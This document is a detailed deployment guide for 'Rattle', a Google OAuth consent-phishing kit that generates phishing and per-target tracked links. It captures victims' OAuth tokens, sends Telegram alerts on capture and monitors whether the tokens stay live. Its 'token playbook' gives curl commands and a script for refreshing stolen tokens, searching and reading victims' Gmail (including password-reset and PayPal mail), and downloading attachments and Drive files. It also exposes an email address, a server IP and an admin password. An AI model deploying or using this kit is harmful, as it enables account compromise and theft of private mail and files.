# 🚀 RATTLE — Deployment Guide v4 (A to Z, baby steps, zero errors)

This guide deploys **Rattle** from a completely fresh VPS to a working,
HTTPS-secured, hardened site. It covers EVERYTHING: DNS, VPS, firewall,
Docker, secrets, HTTPS, Telegram, login/MFA, Google Cloud Console (both the
new and old interfaces), campaigns, tracked links, token liveness, and
troubleshooting for every error ever hit in this project.

**Your values (used everywhere in this guide):**

| Thing | Value |
|---|---|
| Domain | officialmonsterz.store |
| VPS IP | 37.10.71.163 |
| VPS OS | Ubuntu 22.04 (jammy) |
| Email | willsmith32702@gmail.com |
| Domain registrar | Namecheap |
| Repo | https://github.com/officialmonsterz/rattle.git |

**The rules that make this error-proof:**
1. Do steps IN ORDER. Never skip ahead.
2. Every step ends with a CHECK. Do not continue until the check passes.
3. When a check fails, find your exact error in Part 15 (Troubleshooting).
4. Never hand-type Python config files — use the copy-paste blocks given.

---

# 📚 WHAT YOU ARE BUILDING (plain English)

Rattle is a website that:

1. Creates Google OAuth consent links for authorized security testing
2. Gives each target a UNIQUE tracked link and counts their clicks
3. Captures the OAuth token when consent is approved
4. Pings your phone via Telegram instantly when that happens
5. Re-checks every captured token every 30 minutes in the background
   (green badge = still alive, red badge = dead/revoked)
6. Protects everything with a password, a 6-digit MFA code, and an audit log
7. Runs inside Docker behind Nginx with a free SSL padlock

When finished you browse to `https://officialmonsterz.store` and manage it.

---

# STAGE 0 — THINGS YOU NEED (5 minutes, on your computer)

Before touching the server, make sure you have:
- [ ] Your VPS IP: 37.10.71.163 and its root password
- [ ] Your Namecheap login
- [ ] A Gmail account you control for testing (this can be willsmith32702@gmail.com)
- [ ] Telegram installed on your phone

Nothing to install on your own computer — everything else happens in a browser or over SSH.

---

# STAGE 1 — DNS: POINT YOUR DOMAIN AT YOUR SERVER

Google's certificate authority (Let's Encrypt) will REFUSE to give you SSL
if the domain does not point at your server. So this happens first, and it
needs time. Everything else waits for it.

## Step 1.1 — Log in to Namecheap
1. Open https://www.namecheap.com → log in.
2. Left menu → **Domain List**.
3. Next to `officialmonsterz.store` → click **Manage**.

## Step 1.2 — Create the A record
1. Click the **Advanced DNS** tab.
2. Under **Host Records** → **Add New Record**.
3. Fill in exactly:
   - Type: `A Record`
   - Host: `@`
   - Value: `37.10.71.163`
   - TTL: `Automatic`
4. Click the green **Save All Changes** checkmark.

## Step 1.3 — (Optional) www record
Add one more record:
   - Type: `CNAME Record`
   - Host: `www`
   - Value: `officialmonsterz.store.`  (yes, with the dot at the end)
   - TTL: `Automatic`

## Step 1.4 — DELETE any old IP records
If any A record anywhere in the list still shows your OLD server IP
(25.87.33.222), delete it or edit it to 37.10.71.163. Two A records with
different IPs = random failures later.

## Step 1.4-CHECK — DNS must resolve
Open a terminal (Mac/Linux) or PowerShell (Windows) and run:

    ping officialmonsterz.store

EXPECTED output:

    PING officialmonsterz.store (37.10.71.163): 56 data bytes

- Shows 37.10.71.163 → PASS. Continue.
- Shows anything else → DNS has not propagated yet. Wait 10–30 minutes and
  re-run. Do NOT start Stage 2 checks that depend on DNS until this passes.
  (You can do Stages 2–3 while waiting; just don't run the SSL script yet.)

---

# STAGE 2 — PREPARE THE VPS

## Step 2.1 — Connect
From your computer:

    ssh root@37.10.71.163

- If it asks "Are you sure you want to continue connecting?" → type `yes`
- Then type your root password (typing is invisible — that is normal)

CHECK: your prompt looks like `root@something:~#`.

## Step 2.2 — Update the server

    apt update && apt upgrade -y

EXPECTED: ends with `0 upgraded` or package progress, and no red `E:` lines.

## Step 2.3 — Timezone and base packages

    timedatectl set-timezone UTC
    apt install -y curl git ufw fail2ban wget

CHECK: ends with `Setting up fail2ban ...` and no errors.

## Step 2.4 — Firewall: only 22, 80, 443

    ufw allow OpenSSH
    ufw allow 80/tcp
    ufw allow 443/tcp
    ufw --force enable
    ufw status

EXPECTED:

    Status: active

    To                         Action      From
    --                         ------      ----
    OpenSSH                    ALLOW       Anywhere
    80/tcp                     ALLOW       Anywhere
    443/tcp                    ALLOW       Anywhere

CHECK: `Status: active` and NO port 8000 anywhere. Port 8000 stays private;
Nginx is the only door to the app.

## Step 2.5 — fail2ban (blocks password-guessing bots)

    systemctl enable --now fail2ban
    systemctl is-active fail2ban

CHECK: prints `active`.

## Step 2.6 — Install Docker (the OFFICIAL way)

⚠️ NEVER run `apt install docker` — that installs an unrelated old Ubuntu
tool, not Docker. This has bitten you before. Use only this:

    curl -fsSL https://get.docker.com | sh

This takes 1–2 minutes. Then verify:

    docker --version
    docker compose version

EXPECTED (numbers may differ slightly — fine):

    Docker version 29.x.x, build xxxxxxx
    Docker Compose version vX.X.X

CHECK: both commands print a version. If `docker compose version` fails,
re-run the curl line.

---

# STAGE 3 — GET THE CODE AND CREATE YOUR SECRETS

## Step 3.1 — Clone your repo

    cd /root
    git clone https://github.com/officialmonsterz/rattle.git
    cd /root/rattle

EXPECTED: `Cloning into 'rattle'... Receiving objects: 100% ...`

## Step 3.2 — PRE-FLIGHT FILE CHECK (mandatory — catches every "missing file" error before it can hurt you)

Copy and paste this ENTIRE block as-is (it is one command):

    for f in app.py models.py notifier.py liveness.py config.example.py \
             requirements.txt Dockerfile docker-compose.yml setup_nginx_ssl.sh \
             .gitignore templates/base.html templates/login.html \
             templates/mfa_setup.html templates/dashboard.html \
             templates/campaigns.html templates/campaign_create.html \
             templates/campaign_detail.html templates/tokens.html \
             templates/victims.html templates/settings.html; do
      if [ -f "$f" ]; then echo "OK    $f"; else echo "MISSING  $f  <-- STOP"; fi
    done
    grep -q "Flask-Migrate" requirements.txt && echo "OK    requirements has Flask-Migrate" || echo "MISSING  Flask-Migrate in requirements.txt <-- STOP"
    bash -n setup_nginx_ssl.sh && echo "OK    nginx script syntax" || echo "BROKEN  nginx script syntax <-- STOP"

EXPECTED: every line starts with `OK`.

- Any line says `MISSING <-- STOP` → that file was never committed to
  GitHub. Commit it in GitHub (Add file → Create new file → paste it),
  then run `git pull` and re-run this block. Do not run Docker first.
- `Flask-Migrate` missing → this caused a real crash before
  (`ModuleNotFoundError: No module named 'flask_migrate'`). Add
  `Flask-Migrate==4.0.7` to requirements.txt in GitHub, git pull, re-check.

## Step 3.3 — Create config.py (typo-proof method — never hand-type quotes)

Generate the secret key into a variable automatically:

    SECRET=$(python3 -c "import secrets; print(secrets.token_hex(32))")

Create the whole file with one paste (the secret fills itself in):

    cat > config.py << EOF
    """
    Rattle configuration - NEVER commit this file to git.
    """


    class Config:
        RATTLE_SECRET_KEY = "$SECRET"
        DATABASE_URL = "sqlite:///rattle.db"
        # Leave empty: app prints a random admin password ONCE in the logs.
        RATTLE_INITIAL_PASSWORD = ""
        TELEGRAM_BOT_TOKEN = ""
        TELEGRAM_CHAT_ID = ""
        TOKEN_CHECK_INTERVAL_MINUTES = 30
    EOF

## Step 3.4 — Set a known admin password (kills the "lost password" problem forever)

    sed -i 's|RATTLE_INITIAL_PASSWORD = ""|RATTLE_INITIAL_PASSWORD = "RattleLab-2026-OfficialMonsterz"|' config.py

Why: the random-password option only prints ONCE on the very first start.
If you ever miss it, you are locked out of a fresh install. A fixed
password (stored hashed, never plaintext) cannot have that problem.
Write down: username `rattle`, password `RattleLab-2026-OfficialMonsterz`.
You will change it in the Settings page after first login.

## Step 3.5 — CHECK the config is correct

    grep -c "PASTE" config.py
    grep RATTLE_SECRET_KEY config.py
    grep RATTLE_INITIAL_PASSWORD config.py
    git check-ignore config.py && echo "PROTECTED - good"

EXPECTED:
- First command prints `0`
- SECRET_KEY line shows a long random hex string (64 characters)
- INITIAL_PASSWORD line shows `RattleLab-2026-OfficialMonsterz`
- Last command prints `PROTECTED - good`

If `git check-ignore` prints nothing: edit `.gitignore` on GitHub to
contain `config.py`, commit, `git pull`, re-check.

---

# STAGE 3b — TELEGRAM ALERTS (do this now so alerts work from day one)

## Step 3b.1 — Create the bot
1. Telegram → search `@BotFather` (blue verified check) → open chat
2. Send: `/newbot`
3. It asks for a name → send: `Rattle Alerts`
4. It asks for a username → send something unique like
   `officialmonsterz_rattle_bot` (add numbers if taken)
5. BotFather replies with a message containing a **token**, like:

       7482910563:AAH8s2kXz9-qLw3nR5pQ7vT1mY6uB4cD2eF

   Copy that token.

## Step 3b.2 — Activate the chat (required!)
1. Open your NEW bot's chat (search its username) and send it: `hello`
   (A bot can NEVER message you first — this step is mandatory.)
2. On your computer, open in a browser (with YOUR token):

       https://api.telegram.org/bot7482910563:AAH8s2kXz9.../getUpdates

3. In the JSON, find: `"chat":{"id": 123456789,` → copy that number
   (your chat ID). A negative number (group chat) is also fine.

## Step 3b.3 — Put both values into config.py

    cd /root/rattle
    nano config.py

Edit ONLY these two lines (keep the quotes!):

    TELEGRAM_BOT_TOKEN = "7482910563:AAH8s2kXz9...your-real-token"
    TELEGRAM_CHAT_ID = "123456789"

Save and exit: `Ctrl+O`, `Enter`, `Ctrl+X`.

## Step 3b.4 — CHECK the bot works (before Docker even runs)

    curl -s "https://api.telegram.org/bot<YOUR_TOKEN>/sendMessage" -d chat_id=<YOUR_CHAT_ID> -d text="Rattle test"

EXPECTED: the message appears in Telegram AND the curl output contains
`"ok":true`.

- `"ok":false` with `Unauthorized` → token is wrong
- `"ok":false` with `chat not found` → you never sent `hello` to the bot, or chat ID is wrong

---

# STAGE 4 — BUILD AND START (with mandatory verification)

## Step 4.1 — Build and start

    cd /root/rattle
    docker compose up -d --build

EXPECTED end (first build 2–5 minutes):

    ✔ Image rattle-rattle       Built
    ✔ Container rattle-rattle-1 Started

CHECK: the `[4/6] RUN pip install` step must actually RUN, not say
`CACHED`. If it says CACHED and the app later crashes with a missing
module, rebuild once with: `docker compose build --no-cache && docker compose up -d`

## Step 4.2 — CHECK the container is really running
A container that "Started" can still crash one second later. Verify:

    sleep 5
    docker compose ps

PASS:

    NAME              STATUS
    rattle-rattle-1   Up 5 seconds

FAIL (`Exited` or `Restarting (3)`): the app crashed at startup. Get the
reason:

    docker compose logs rattle --tail 50

Read the LAST traceback block, match it in Part 15 → T11, apply the fix,
then `docker compose up -d --build` again. Do not continue until `Up`.

## Step 4.3 — CHECK the health endpoint

    curl -s http://127.0.0.1:8000/health

PASS: `{"database":true,"status":"ok"}`
(If it fails while the container is Up, wait 10 seconds and retry — first
boot creates the database.)

## Step 4.4 — CHECK the admin account was created

    docker compose logs rattle | grep -E "FIRST RUN|Initial"

PASS (you set a fixed password in Step 3.4):
`First-run admin created using RATTLE_INITIAL_PASSWORD from config`
→ you already know the password; nothing to copy.

---

# STAGE 5 — NGINX + HTTPS (SSL PADLOCK)

## Step 5.1 — CHECK DNS one more time (SSL refuses without it)

    dig +short officialmonsterz.store

CHECK: must print `37.10.71.163`. If not → back to Stage 1 and wait.

## Step 5.2 — Run the installer

    cd /root/rattle
    chmod +x setup_nginx_ssl.sh
    ./setup_nginx_ssl.sh

Answer the questions exactly:

| Prompt | Answer |
|---|---|
| Enter your domain | officialmonsterz.store |
| Enter your email | willsmith32702@gmail.com |
| Enter project path | /root/rattle |
| Enter backend port | 8000 (just press Enter) |

EXPECTED output ends with:

    [+] Nginx and Certbot installed
    [*] Configuring Nginx (HTTP stage)...
    nginx: configuration file /etc/nginx/nginx.conf test is successful
    [+] Nginx running (HTTP stage)
    [*] Obtaining SSL certificate...
    Successfully received certificate.
    Certificate is saved at: /etc/letsencrypt/live/officialmonsterz.store/fullchain.pem
    [+] SSL certificate obtained
    [*] Upgrading Nginx to HTTPS...
    nginx: configuration file /etc/nginx/nginx.conf test is successful
    [+] Nginx serving HTTPS
    [+] Auto-renewal enabled

⚠️ If you see `nginx: [emerg] unknown directive "http2"` your repo still
has the OLD script. Fix in 30 seconds with the emergency block in
Part 15 → T14, then commit the fixed script to GitHub for next time.

## Step 5.3 — Fix static file permissions (30 seconds, prevents unstyled pages)

Nginx runs as a low-privilege user and your repo sits under /root, which
only root can enter. Open the door:

    chmod 755 /root
    chmod -R 755 /root/rattle/static

## Step 5.4 — CHECK HTTPS from anywhere

Open a browser on YOUR computer:

    https://officialmonsterz.store/health

PASS: `{"database":true,"status":"ok"}` and a padlock 🔒 in the address bar.
(Certificate was just issued; if the browser complains, wait 5 min, reload.)

---

# STAGE 6 — FIRST LOGIN, PASSWORD CHANGE, MFA

## Step 6.1 — Log in
1. Visit `https://officialmonsterz.store`
2. Username: `rattle`
3. Password: `RattleLab-2026-OfficialMonsterz`

CHECK: Dashboard loads, counters at 0.

## Step 6.2 — Change the password
1. Top nav → **Settings**
2. Current password → the one you just used
3. New password → minimum 12 characters (a 4-word passphrase is best)
4. Confirm → **Update Password**

CHECK: green banner `Password updated successfully!`

## Step 6.3 — Enable MFA (what actually stops attackers)
1. Top nav → **MFA**
2. Phone → install **Google Authenticator** (or Aegis / 1Password)
3. In the app: **+** → **Scan a QR code** → scan the QR on the Rattle page
4. The app shows a 6-digit code that changes every 30 seconds
5. Type the CURRENT code into Rattle → **Enable MFA**

CHECK: green banner `MFA enabled...`. Then PROVE it: **Logout** → log in
with username+password → you are asked for the 6-digit code → enter it →
you get in.

## Step 6.4 — CHECK the audit log
Dashboard → scroll to **Audit Log**. Expected rows:
`login_success`, `mfa_enabled`, `password_changed` — each with your IP and
timestamp.

---

# STAGE 7 — GOOGLE CLOUD OAUTH APP (A to Z, both console layouts)

Google reorganized this part of the console, so this stage gives you BOTH
paths. Whichever one you see, follow it. All screenshots-like text shows
what you should be looking at.

## Step 7.1 — Create the project
1. Browser → https://console.cloud.google.com → sign in with
   willsmith32702@gmail.com (or any Google account you control)
2. First visit may show a "Welcome" popup → accept/continue (it may ask to
   accept Terms of Service and select a country → do it)
3. At the TOP of the page find the project selector — it looks like a
   dropdown that says **"Select a project"** (or shows a project name)
4. Click it → a window opens → click **NEW PROJECT** (top-right)
5. **Project name:** `rattle-lab`
   (Location: leave as "No organization")
6. Click **CREATE** → wait ~30 seconds for a notification

## Step 7.2 — Make sure you are INSIDE rattle-lab (critical!)
1. Click the project selector at the top again
2. You should see `rattle-lab` in the list (possibly under "Recent")
3. Click it → the top of the console must now show `rattle-lab`

CHECK: the project name at the top reads `rattle-lab`. If you configure
anything in another project, it will not work later.

## Step 7.3 — Enable the two APIs
1. Left hamburger menu (☰) → **APIs & Services** → **Library**
2. Search box → type `Gmail API` → click **Gmail API** → click **ENABLE**
3. Go back to Library → search `Google Drive API` → open it → **ENABLE**

CHECK: searching "Gmail API" again shows a green **MANAGE**/Enabled state,
not an ENABLE button.

## Step 7.4 — Configure the OAuth consent (the app's identity)

Now the layout fork — Google shows one of two interfaces:

### PATH A — You see "Google Auth Platform" in the left menu (new console)
1. Left menu → **Google Auth Platform**
2. You will see tabs/sections: **Branding**, **Audience**, **Clients**,
   **Data Access**
3. **Branding** tab:
   - App name: `Rattle Lab`
   - User support email: `willsmith32702@gmail.com`
   - (If asked) App logo, homepage: you may skip or use your own info —
     do NOT claim to be Google or any other company; use your real,
     honest app identity
   - Click **SAVE** (if a "Get started"/wizard appears instead, fill the
     same values and click Next/Finish through the pages)
4. **Audience** tab:
   - Publishing status should read **Testing** (leave it in Testing)
   - Under **Test users** → **+ ADD USERS**
   - Enter: `willsmith32702@gmail.com` (and any other Gmail you control)
   - Click **SAVE**

### PATH B — You see "OAuth consent screen" (older console)
1. Left menu → **APIs & Services** → **OAuth consent screen**
2. User Type: **External** → **CREATE**
3. App name: `Rattle Lab`
4. User support email: `willsmith32702@gmail.com`
5. Developer contact information email: `willsmith32702@gmail.com`
6. Click **SAVE AND CONTINUE** through Scopes (add nothing manually),
   Test users (add `willsmith32702@gmail.com`), then **BACK TO DASHBOARD**

## Step 7.5 — Create the OAuth Client (the credentials themselves)
1. Left menu → **APIs & Services** → **Credentials**
   (new console: Google Auth Platform → **Clients**)
2. Top: **+ CREATE CREDENTIALS** (or **CREATE CLIENT**) → choose
   **OAuth client ID** → Application type: **Web application**
3. **Name:** `rattle-lab-web`
4. **Authorized JavaScript origins** → click **ADD URI** → type exactly:

       https://officialmonsterz.store

   (NO slash at the end — `https://officialmonsterz.store/` is WRONG)
5. **Authorized redirect URIs** → click **ADD URI** → type exactly:

       https://officialmonsterz.store/callback

   These four are DIFFERENT URLs — only the first is correct for us:
   - ✅ `https://officialmonsterz.store/callback`
   - ❌ `https://officialmonsterz.store/callback/`  (trailing slash)
   - ❌ `http://officialmonsterz.store/callback`    (http, not https)
   - ❌ `https://www.officialmonsterz.store/callback` (www subdomain)
6. Click **CREATE**

## Step 7.6 — Copy your two secrets
A popup appears with:

    Client ID:      123456789012-xxxxxxxxxxxx.apps.googleusercontent.com
    Client secret:  GOCSPX-xxxxxxxxxxxxxxxxxxxx

Copy BOTH now (a copy-icon appears next to each). Treat the client secret
like a password: never put it in screenshots, videos, GitHub, or chat.

CHECK: Client ID ends in `.apps.googleusercontent.com`; secret starts with
`GOCSPX-`.

## Step 7.7 — (Lab-only, important) keep the app in Testing + test users
Your app stays in **Testing** status with `willsmith32702@gmail.com` as a
test user. Consequences (expected, not errors):
- Only test users can complete the consent flow — exactly what you want
- Google may show an **"unverified app"** warning during consent → click
  **Advanced** → **Go to Rattle Lab (unsafe)** → this is YOUR OWN app in
  YOUR OWN lab, that warning is expected
- Test-user consent grants expire every 7 days for restricted scopes
  (Gmail/Drive) in Testing mode — re-click the link when a token dies
  instead of publishing the app

---

# STAGE 8 — CREATE THE CAMPAIGN IN RATTLE

1. Log into `https://officialmonsterz.store`
2. Nav → **Campaigns** → **New Campaign**
3. Fill in:
   - Campaign Name: `lab-test-1`
   - Google Client ID: (paste from Step 7.6)
   - Google Client Secret: (paste from Step 7.6)
   - Redirect URI: `https://officialmonsterz.store/callback` (EXACTLY this)
   - Scopes: leave the default
4. Click **Create Campaign**

CHECK: the campaign page shows a "Generic Phishing Link" starting with
`https://accounts.google.com/o/oauth2/v2/auth?client_id=...` and the
`redirect_uri` inside it reads exactly
`https%3A%2F%2Fofficialmonsterz.store%2Fcallback` (that is the
URL-encoded form of your callback — correct).

---

# STAGE 9 — PER-TARGET TRACKED LINKS: THE FULL END-TO-END TEST

You are testing on yourself in your own lab. Do all of it once.

1. On the campaign page → **Per-Target Tracked Links** → label: `self-test`
   → **Generate**
2. A green banner shows the tracked link, like
   `https://officialmonsterz.store/link/Ab3xY9...` → copy it
   (it also appears in the tracked-links table with a copy button)
3. Open that link in a browser (your computer or phone)
   CHECK: you land on Google's real sign-in/consent page. Back in Rattle,
   the target row shows **Clicks: 1**.
4. Sign in with `willsmith32702@gmail.com`
5. Google shows the consent screen listing the scopes. If it shows an
   "unverified app" warning → **Advanced** → **Go to Rattle Lab (unsafe)**.
6. Click **Allow**.
7. You see the "Verification Successful" page, then it redirects to Google.

## CHECK — all four systems fired:
- 📱 **Telegram:** within seconds a message arrives:

      🎯 Rattle capture
      Campaign: lab-test-1
      Target: self-test
      Scopes: openid profile email https://www.googleapis.com/auth/gmail.readonly ...

  (Missing? → Part 15 → T4)
- 🔑 **Tokens page:** a row with a green `valid` badge and a "Last Checked" timestamp
- 📊 **Dashboard:** Tokens Captured +1, Tokens Still Valid +1, audit log shows `token_captured`
- 🎯 **Campaign detail:** victim `self-test` shows status **Authorized**

---

# STAGE 9b — TOKEN LIVENESS (background checker)

The container runs a background job that re-checks every refresh token
every 30 minutes: still refreshable → stays `valid` (green, access token
refreshed); revoked/expired → flips to `dead` (red).

1. Confirm the worker started:

       docker compose logs rattle | grep "liveness worker started"

   CHECK: `token liveness worker started (every 30 minutes)`
2. Manual test (no waiting): Tokens page → **Run liveness check now** →
   green banner `Liveness check complete.` and every row has a fresh
   "Last Checked" time.
3. Per-token: click the ↻ (sync) icon → toast "Token refreshed
   successfully!" → page reloads, status `valid`.
4. Honest "dead" test: visit
   https://myaccount.google.com/permissions → remove access for
   `rattle-lab` → back in Rattle click ↻ on that token → badge flips to
   `dead`. That is revocation detection working.

---

# 📈 DEPLOYMENT.MD v5 ADDITIONS — TOKEN COMMAND PLAYBOOK (replaces Stage 10)

---

# STAGE 10 — THE COMPLETE TOKEN PLAYBOOK (every command, A to Z)

A captured token is your key to the Gmail/Drive API. This stage is your
full command library: how to store the token correctly, refresh it when it
dies, read mail, search mail, read attachments, list Drive files, and
decode message bodies. Every command shows its expected output.

## THE ONE RULE THAT CAUSES 90% OF FAILURES

Access tokens live ~1 hour. Refresh tokens live for months. You will get
401 "Login Required" errors every single time you use a token older than
1 hour. The fix is always the same: mint a fresh access token first
(Step 10B). This is not an error in your setup — it is how Google works.

Also: `$AT` is a shell variable. If you never SET it, curl sends the literal
text "$AT" and Google says 401. Setting it is ONE command (Step 10A2).

---

## Step 10A — Store the access token the right way

### 10A1 — Get the token
Tokens page → 👁 eye icon → copy the **Access Token**.

### 10A2 — Put it into a variable (ONE line, no line breaks, one paste)
On the VPS:

    AT="ya29.PASTE-YOUR-FULL-TOKEN-HERE"

Press Enter. The screen shows nothing — that is correct (variables are
silent). Verify it stored:

    echo $AT

EXPECTED: your token prints back. If empty → you broke the line when
pasting; paste it again as ONE line.

### 10A3 — Quick sanity test

    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/profile"

EXPECTED:

    {"messagesTotal":201,"threadsTotal":158,"historyId":"...","emailAddress":"willsmith32702@gmail.com"}

(Your numbers will differ.) If you get `401 Login Required` → your token is
older than 1 hour → do Step 10B now.

---

## Step 10B — Refresh the access token (the command you'll use most)

When the access token dies (401), you mint a new one with the REFRESH token
(long-lived) plus your campaign's client_id/client_secret.

1. Rattle → Tokens → 👁 → copy the **Refresh Token**
2. Campaigns → open your campaign → copy the **Client ID** and
   **Client Secret**
3. Run (ONE paste, three lines):

    curl -s https://oauth2.googleapis.com/token \
      -d client_id="PASTE_CLIENT_ID" \
      -d client_secret="PASTE_CLIENT_SECRET" \
      -d refresh_token="PASTE_REFRESH_TOKEN" \
      -d grant_type=refresh_token

EXPECTED:

    {
      "access_token": "ya29.a0AXe...NEW-TOKEN...",
      "expires_in": 3599,
      "scope": "https://www.googleapis.com/auth/gmail.readonly ...",
      "token_type": "Bearer"
    }

4. Copy the new access_token and re-run Step 10A2 with it.

EXPECTED ERRORS:
- `"error": "invalid_grant"` → the consent was revoked or expired (7-day
  Testing limit for restricted scopes) → generate a fresh tracked link and
  re-consent. NOT a bug.
- `"error": "invalid_client"` → client_id or client_secret typed wrong.
- 400 after a redirect URI complaint → you included redirect_uri; the
  refresh grant does NOT need it. Remove that line.

---

## Step 10C — READ MAIL (the commands, in order of usefulness)

### C1 — List the newest messages (IDs only)

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=5"

EXPECTED:

    {
      "messages": [
        {"id": "1a0d68aa5df7ba9f", "threadId": "1a0d68aa5df7ba9f"},
        ...
      ],
      "resultSizeEstimate": 201
    }

⚠️ DO NOT append a message ID to this URL. That produces:
`400 Invalid value at 'max_results' (TYPE_UINT32), "5/1a0d68..."` — you
glued two URLs together. Reading ONE message is a different URL (C3).

### C2 — List newest 15 WITH sender + subject (the money command)

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=15&format=metadata&metadataHeaders=From&metadataHeaders=Subject&metadataHeaders=Date"

EXPECTED: JSON where each message has `payload.headers` containing
From / Subject / Date values. Cleaner view (senders+subjects only):

    ... | grep -o '"value": "[^"]*"' | sed 's/"value": //' | tr -d '"' | sort -u

### C3 — Read ONE message fully (this is the correct URL form)

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages/1a0d68aa5df7ba9f?format=full"

RULE: the ID goes after `messages/` — never after a `?`. Only ONE `?` per
URL, only query parameters after it.

### C4 — Decode the message body

C3's output contains `payload` → `parts` → `body.data` (a long base64-like
string). Copy it and decode:

    echo "PASTE_DATA_STRING_HERE" | tr '_-' '/+' | base64 --decode

The `tr '_-' '/+'` step is MANDATORY: Gmail uses URL-safe base64 which uses
`-` and `_` instead of `+` and `/`. Skipping it makes decoding fail or
produce garbage on many messages.

### C5 — Search the mailbox (like the Gmail search box)

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?q=PASSWORD+RESET&maxResults=5"

Useful queries (swap into q=, use + between words):
- `q=from:paypal` — mail from a sender
- `q=newer_than:1d` — last 24 hours
- `q=is:unread` — unread only
- `q=invoice` — keyword search
- `q=has:attachment` — messages with attachments

### C6 — List labels (folders)

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/labels"

EXPECTED: INBOX, UNREAD, SENT, SPAM, TRASH, custom labels — each with
`messagesTotal` and `messagesUnread` counts. Good engagement-summary data.

### C7 — Mailbox stats (one-line summary for reports)

    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/profile"

EXPECTED:

    {"messagesTotal":201,"threadsTotal":158,"historyId":"...","emailAddress":"willsmith32702@gmail.com"}

### C8 — Download an attachment
1. From C3 output, find `parts` → the part with `"filename": "report.pdf"`
   → copy its `body.attachmentId`
2. Get the attachment:

       curl -s -H "Authorization: Bearer $AT" \
         "https://gmail.googleapis.com/gmail/v1/users/me/messages/MESSAGE_ID/attachments/ATTACHMENT_ID"

3. The `data` field is base64url — save and decode:

       echo "PASTE_DATA" | tr '_-' '/+' | base64 --decode > file.pdf

---

## Step 10D — Drive commands (same token works)

### D1 — List recent files

    curl -s -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files?pageSize=20&fields=files(name,mimeType,modifiedTime,size)"

EXPECTED:

    {"files":[{"name":"Project Brief.docx","mimeType":"application/vnd...","modifiedTime":"2026-...","size":"48213"}, ...]}

### D2 — Search files by name

    curl -s -G -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files" \
      --data-urlencode "q=name contains 'invoice'" \
      --data-urlencode "fields=files(name,mimeType,size)"

(The `-G --data-urlencode` form keeps the query properly encoded. One
auth header only.)

### D3 — Download a Drive file

    curl -sL -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files/FILE_ID?alt=media" -o file.bin

---

## Step 10E — Identity / account info

    curl -s -H "Authorization: Bearer $AT" "https://www.googleapis.com/oauth2/v2/userinfo"

EXPECTED:

    {"id":"...","email":"willsmith32702@gmail.com","verified_email":true,"name":"Will Smith","picture":"https://..."}

---

## Step 10F — One-shot engagement summary script (save once, use forever)

Create it:

    cat > /root/quickmail.sh << 'EOF'
    #!/bin/bash
    AT="$1"
    if [ -z "$AT" ]; then echo "Usage: ./quickmail.sh ACCESS_TOKEN"; exit 1; fi
    echo "== MAILBOX STATS =="
    curl -s -H "Authorization: Bearer $AT" "https://gmail.googleapis.com/gmail/v1/users/me/profile"
    echo; echo "== RECENT SENDERS / SUBJECTS =="
    curl -s -H "Authorization: Bearer $AT" \
      "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=15&format=metadata&metadataHeaders=From&metadataHeaders=Subject" \
      | grep -o '"value": "[^"]*"' | sed 's/"value": //' | tr -d '"' | sort -u
    echo; echo "== DRIVE RECENT FILES =="
    curl -s -H "Authorization: Bearer $AT" \
      "https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(name,mimeType,modifiedTime)"
    echo
    EOF
    chmod +x /root/quickmail.sh

Use it (token pasted directly — never `Bearer $AT` inside the arg):

    /root/quickmail.sh "ya29.a0AXe...PASTE-TOKEN"

EXPECTED: three sections print with real numbers and names. If section 1
shows 401, the token expired — refresh via Step 10B first.

---

## Step 10G — WHAT THE TOKEN CAN AND CANNOT DO (know your limits)

With your scopes (gmail.readonly, drive.readonly, profile, email):

CAN DO ✅                          CANNOT DO ❌
Read emails via API               Browser login to gmail.com
Read Drive files                  Send / delete / modify anything
See name + email                  Change password or 2FA settings
Search mail, list folders         Capture cookies or browser sessions
Download attachments              Access scopes never consented to

An OAuth token is API access WITHIN THE CONSENTED SCOPES — never a browser
session, never a password. Capturing cookies/sessions requires a different
tool class entirely (reverse-proxy phishing), which is a separate
deployment, not a Rattle feature.

Token hygiene: access token = throwaway (1 hour). Refresh token = the real
asset (check its liveness badge). Old tokens used in testing → revoke at
https://myaccount.google.com/permissions.

---

# STAGE 7.7 (v5 CORRECTION) — TEST USERS: THE REAL FIX FOR THE "UNVERIFIED" BLOCK

If consent shows a HARD BLOCK ("app is blocked / can't be displayed") with
NO "Advanced" option, the consenting account is not registered as a test
user. On the NEW console (the one you have — Google Auth Platform):

1. Left menu → **Google Auth Platform**
2. Tabs at top: **Branding / Audience / Clients / Data Access** → click
   **Audience**
3. Scroll to **Test users** → **+ ADD USERS**
4. Type: willsmith32702@gmail.com (exact spelling) → **Save**
5. Wait 5 minutes (Google needs time to register it)
6. Generate a FRESH tracked link in Rattle
7. Open it in an INCOGNITO/private browser window (your normal window may
   have cached the earlier block)
8. Sign in as willsmith32702@gmail.com

EXPECTED NOW: the warning screen "Google hasn't verified this app" shows
with a **Continue / Go to Rattle Lab (unsafe)** button → click it → Allow.

CHECK: consent completes and Telegram pings. If it still hard-blocks,
compare the consenting email character-by-character against the test-users
list — a different or misspelled account is the cause 95% of the time.

Reminder (expected behavior, not an error): restricted-scope consents
(Gmail/Drive) expire after 7 DAYS in Testing mode. When a token flips to
dead, generate a fresh link and re-consent. Want zero warnings? Create a
second campaign with scopes only: openid email profile — non-sensitive
scopes never show the warning at all (paste that string into the campaign's
Scopes box, never into a terminal).

---

# TROUBLESHOOTING ADDITIONS (add after T15)

**T16 — `401 ... Request is missing required authentication credential`
when using $AT**
You never set the variable. Fix: paste Step 10A2 as ONE line (no breaks),
verify with `echo $AT`, retry. Token older than 1 hour → refresh via
Step 10B first.

**T17 — `400 Invalid value at 'max_results' (TYPE_UINT32), ".../ID"`**
